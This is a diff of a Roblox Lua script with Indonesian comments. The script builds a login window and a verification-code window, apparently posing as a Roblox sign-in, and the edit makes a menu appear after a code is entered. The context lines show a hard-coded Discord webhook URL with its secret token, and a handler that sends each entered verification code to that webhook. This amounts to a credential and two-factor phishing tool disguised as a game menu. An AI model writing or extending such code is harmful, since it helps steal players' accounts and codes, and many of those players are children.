@@ -1,3 +1,5 @@
+# Menu GUI
+
 -- URL Webhook Discord
 local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
 
@@ -161,7 +163,7 @@ local function createMenuGUI()
     end)
 end
 
--- Fungsi Membuat GUI Verifikasi Kode
+-- Fungsi untuk membuat GUI Verifikasi Kode
 local function createVerificationCodeGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
@@ -235,6 +237,7 @@ local function createVerificationCodeGUI()
             sendToDiscord("Kode Verifikasi: " .. verificationCode)
             print("Kode verifikasi telah dikirim ke Discord!")
             gui:Destroy()
+            createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
         else
             errorLabel.Text = "Harap masukkan kode verifikasi!"
         end
@@ -333,17 +336,6 @@ local function createLoginGUI()
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-   -- Subtitle Label
-    subtitleLabel.Name = "SubtitleLabel"
-    subtitleLabel.Parent = frame
-    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
-    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
-    subtitleLabel.BackgroundTransparency = 1
-    subtitleLabel.Font = Enum.Font.SourceSans
-    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
-    subtitleLabel.TextSize = 16
-    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    
     -- Username Box
     usernameBox.Name = "UsernameBox"
     usernameBox.Parent = frame
